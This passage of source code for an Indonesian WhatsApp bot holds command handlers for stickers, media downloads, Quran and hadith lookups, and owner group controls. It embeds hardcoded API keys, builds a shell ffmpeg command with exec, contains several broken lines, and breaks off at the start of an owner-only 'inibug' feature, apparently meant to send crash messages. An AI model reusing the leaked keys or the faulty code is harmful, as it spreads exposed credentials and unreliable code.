case 'toimage': case 'toimg': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let media = await liaacans.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
liaacans.sendMessage(m.chat, { image: buffer }, { quoted: fkontak })
fs.unlinkSync(ran)
})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
m.reply(mess.wait)
arg = args.join(' ')
mee = await liaacans.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('../message/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await liaacans.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.titlestic })
await fs.unlinkSync(memek)
}
break 
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
m.reply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await liaacans.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.titlestic })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await liaacans.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.titlestic })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
        	m.reply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await liaacans.downloadMediaMessage(quoted)
                    let encmedia = await liaacans.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                    let media = await liaacans.downloadMediaMessage(quoted)
                    let encmedia = await liaacans.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
case 'emojimix': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
	let [emoji1, emoji2] = text.split`+`
	if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
	if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
	let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
	for (let res of anu.results) {
	    let encmedia = await liaacans.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.titlestic, categories: res.tags })
	    await fs.unlinkSync(encmedia)
	}
        }
        break
        case 'emojimix2': {
        if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
        if (!text) throw `Example : ${prefix + command} 😅`
	let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
	for (let res of anu.results) {
	    let encmedia = await liaacans.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.titlestic, categories: res.tags })
	    await fs.unlinkSync(encmedia)
	}
        }
        break
case 'tomp3': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
m.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('../message/converter')
let audio = await toAudio(media, 'mp4')
liaacans.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${liaacans.user.name}.mp3`}, { quoted: fkontak })
}
break
case 'tomp4': case 'tovideo': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
m.reply(mess.wait)
let { webp2mp4File } = require('../message/uploader')
let media = await liaacans.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await liaacans.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: fkontak })
await fs.unlinkSync(media)
}
break
case 'tourl': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
  m.reply(mess.wait)
  let { UploadFileUgu, webp2mp4File, TelegraPh } = require('../message/uploader')
  let media = await liaacans.downloadAndSaveMediaMessage(quoted)
  if (/image/.test(mime)) {
  let anu = await TelegraPh(media)
  m.reply(util.format(anu))
  } else if (!/image/.test(mime)) {
  let anu = await UploadFileUgu(media)
  m.reply(util.format(anu))
  }
  await fs.unlinkSync(media)
  }
  break
//Random Menu
case 'pinterest': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
  if (!text) return m.reply(`Mau Cari Apa Di ${command}?\nExample : *${prefix + command} hinata*`)
  m.reply(mess.wait)
  let anu = await pinterest(text)
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonspinterest = [{buttonId: `pinterest ${text}`, buttonText: {displayText: 'Next Result'}, type: 1}]
  liaacans.sendMessage(m.chat, { image: { url: result }, caption: 'Source Url : '+result, buttons: buttonspinterest }, { quoted: fkontak })
  }
  break
case 'wallpaper': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
  if (!text) return m.reply(`Mau Cari Apa Di ${command}?\nExample : *${prefix + command} hinata*`)
  m.reply(mess.wait)
  let anu = await wallpaper(text)
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonswallpaper = [{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Result'}, type: 1}]
  liaacans.sendMessage(m.chat, { image: { url: result.image[0] }, caption: `Source Url : ${result.image[2] || result.image[1] || result.image[0]}`, buttons: buttonswallpaper }, { quoted: fkontak })
  }
  break
case 'quotesanime': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
  m.reply(mess.wait)
  let anu = await quotesAnime()
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonsquotes = [{buttonId: `quotesanime`, buttonText: {displayText: 'Next Result'}, type: 1}]
  liaacans.sendButtonText(m.chat, buttonsquotes, `${result.quotes}\n\nBy : ${result.karakter}`, global.ownerName, m)
  }
  break
case 'wikimedia': {
  if (!isPremium) throw mess.prem
  if (!text) return 'Masukkan Query Title'
  let wiki = await wikimedia(text)
  result = wiki[Math.floor(Math.random() * wiki.length)]
  let buttons = [{buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Result'}, type: 1}]
  let buttonMessage = {
  image: { url: result.image },
  caption: `📄 Title : ${result.title}
📬 Source : ${result.source}
🔗 Media Url : ${result.image}`,
  footer: global.ownerName,
  buttons: buttons,
  headerType: 4
  }
  liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
  }
  break
//Downloader
case 'ytmp4': case 'ytvideo': case 'ytv': {
  if (!isPremium) throw mess.prem
  let { ytv } = require('../message/y2mate')
  if (!q) return m.reply(`Gunakan Format : ${command} linknya`)
  if (!isUrl(q)) return m.reply('Link Invalid ❎')
  if (!q.includes('youtube')/('youtu.be')) return m.reply('Link Invalid ❎')
  await m.reply(mess.wait)
  let quality = args[1] ? args[1] : '360p'
  let media = await ytv(text, quality)
  if (media.filesize >= 100000) return m.reply('File Melebihi Batas Silahkan Download Sendiri : '+media.dl_link)
  var txtytt = `---- Youtube Downloader -----
  
📄 Judul : ${media.title}
🎚️ Size : ${media.filesizeF}
🔗 Url : ${isUrl(text)}
📥 Format : MP4
📮 Resolusi : ${args[1] || '720p'}`
  liaacans.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: txtytt }, { quoted: m })
  }
  break
case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		liaacans.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		/**case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		liaacans.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break**/
		case 'hadis': case 'hadist': {
		if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		liaacans.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
case 'ytmp3': case 'ytaudio': case 'yta': {
  if (!isPremium) throw mess.prem
  let { yta } = require('../message/y2mate')
  if (!q) return m.reply(`Gunakan Format : ${command} linknya`)
  if (!isUrl(q)) return m.reply('Link Invalid ❎')
  if (!q.includes('youtube')/('youtu.be')) return m.reply('Link Invalid ❎')
  await m.reply(mess.wait)
  let quality = args[1] ? args[1] : '128kbps'
  let media = await yta(text, quality)
  if (media.filesize >= 100000) return m.reply('File Melebihi Batas Silahkan Download Sendiri : '+media.dl_link)
  var txtytdio = `*------ Youtube Downloader -----*

📄 Title : ${media.title}
🎚️ Size : ${media.filesizeF}
🔗 Url : ${isUrl(text)}
📥 Format : MP3
📮 Resolusi : ${args[1] || '128kbps'}`
  liaacans.sendImage(m.chat, media.thumb, txtytdio, m)
  liaacans.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `${media_title}.mp3`}, { quoted: fkontak })
  }
  break
case 'yts': case 'ytsearch': {
  if (!isPremium) throw mess.prem
  m.reply(mess.wait)
  if (!text) return `Example : ${prefix + command} story wa anime`
  let yts = require("yt-search")
  let search = await yts(text)
  let teks = '*---- Data Ditemukan ----*\n\n Keywords : '+text+'\n\n'
  let no = 1
  for (let i of search.all) {
  teks += `🔢 No : ${no++}
🎞️ Type : ${i.type}
📀 Video ID : ${i.videoId}
📄 Title : ${i.title}
👁️ Views : ${i.views}
👁️ Duration : ${i.timestamp}
📤 Upload : ${i.ago}
👨‍🎤 Author : ${i.author.name}
🔗 Url : ${i.url}\n\n─────────────────\n\n`
  }
  liaacans.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: fkontak })
  }
  break
case 'play':
  if (!isPremium) throw mess.prem
  if (!text) return `Example : ${prefix + command} story wa anime`
  let yts = require("yt-search")
  let search = await yts(text)
  let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
  let buttons = [{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: 'Audio 🎵'}, type: 1}, {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: 'Video 🎦'}, type: 1}]
  let buttonMessage = {
  image: { url: anu.thumbnail },
  caption: `*----- DATA DITEMUKAN -----*
  
*📄 Title :* ${anu.title}
*⌚ Duration :* ${anu.timestamp}
*👁️ Viewers :* ${anu.views}
*📤 Upload :* ${anu.ago}
*👨‍🎤 Channel :* ${anu.author.url}
*🔗 Url :* ${anu.url}`,
  footer: creator,
  buttons: buttons,
  headerType: 4
  }
  liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
  break
case 'tiktokmp3': case 'tiktokaudio': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://anabotofc.herokuapp.com/api/download/tiktok2?url=${text}&apikey=AnaBot`)
                let buttons = [
                    {buttonId: `allmenu`, buttonText: {displayText: '📖List Menu'}, type: 1},
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: creator,
                    buttons: buttons,
                    headerType: 2
                }
                await liaacans.sendMessage(m.chat, buttonMessage, { quoted: m })
                liaacans.sendMessage(m.chat, { audio: { url: anu.result.nowm }, mimetype: 'audio/mpeg'}, { quoted: fkontak })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('liaacans', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) liaacans.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson('https://restapi-liaacans.herokuapp.com/api/download/tiktok2?url=https://vt.tiktok.com/ZSeJ7P56G&apikey=APIKEY')
                    liaacans.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/downloader/joox', { query: text }, 'apikey'))
                await liaacans.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                liaacans.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                await liaacans.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                liaacanssendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: fkontak })
            }
            break
	        case 'twitdl': case 'twitter': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('liaacans', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                await liaacans.sendMessage(m.chat, buttonMessage, { quoted: m })
                liaacans.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: fkontak })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                liaacans.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `⭔ Title : ${anu.result.title}`}, { quoted: fkontak })
            }
            break
	        case 'pindl': case 'pinterestdl': {
	        if (!isPremium) throw mess.prem
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                liaacans.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: fkontak })
            }
            break
            case 'umma': case 'ummadl': {
              if (!isPremium) throw mess.prem
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('../message/scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: liaacans.user.name,
			buttons,
			headerType: 4
		    }
		    liaacans.sendMessage(m.chat, buttonMessage, { quoted: fkontak })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        liaacans.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
case 'join': {
if (!isCreator) throw mess.owner
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await liaacans.groupAcceptInvite(result)
m.reply(`Sukses`)
}
break
case 'leave': {
if (!isCreator) throw mess.owner
   m.reply(`babay grup tolol:v`)
await liaacans.groupLeave(m.chat)
}
break
case 'block': {
if (!isCreator) throw mess.owner
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.updateBlockStatus(users, 'block')
 m.reply(`Sukses Block User`)
}
break
case 'unblock': {
if (!isCreator) throw mess.owner
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.updateBlockStatus(users, 'unblock')
m.reply(`Sukses Unblock User`)
}
break
case 'public': {
                if (!isCreator) throw mess.owner
                liaacans.public = true
                m.reply('*Sukses Change To Public Usage*')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                liaacans.public = false
                m.reply('*Sukses Change To Self Usage*')
            }
            break
case 'delete': case 'del': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                liaacans.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'delete2': case 'del2': { // fix by aulia rahman
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.quoted) throw `Reply Untuk Menghapus Pesan Orang Lain`
liaacans.sendMessage(m.chat, { delete: m.quoted })
}
break
case 'menfes': case 'menfess': { 
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
		        if (m.isGroup) throw ('fitur tidak dapat digunakan di grup')
            	if (!text) throw `Example : ${prefix + command} 62858xxxxx|nama samaran|pesan`
            var mon = args.join(' ')
            var m1 = mon.split("|")[0]
            var m2 = mon.split("|")[1]
            var m3 = mon.split("|")[2]
               let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `BOT TELAH ONLINE : ${runtime(process.uptime())}`,jpegThumbnail: global.thumb}}}
               let mq1 = m1 + '@s.whatsapp.net'
               let userr = m.sender
               let mentss = [userr]
               let kawk = (`Dichat Oleh @${userr.split('@')[0]}\nhttps://wa.me/${userr.split('@')[0]}\nSilahkan Balas Dengan ${prefix}menfess 62858xxxxx|nama samaran|pesan`)
               let me = m.sender
               let ments = [mq1, me]
               let pjtxt = `Pesan Dari : ${m2} \nUntuk : @${mq1.split('@')[0]}\n\n${m3}`
               let buttons = [{ buttonId: 'oke', buttonText: { displayText: 'Confirm' }, type: 1 }]
            await liaacans.sendButtonText(m1 + '@s.whatsapp.net', buttons, pjtxt, kawk, m, {mentions: ments, mentions: mentss, quoted: kafloc})
            let akhji = `Pesan Telah Terkirim\nKe @${mq1.split('@')[0]}`
            await liaacans.sendButtonText(m.chat, buttons, akhji, creator, m, {mentions: ments, quoted: kafloc})
            }
            break
//----------------[ BUG ALL FIXED ]-----------------//
// JANGAN DI SALAH GUNAKAN FITUR INI!!!
case 'inibug': {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
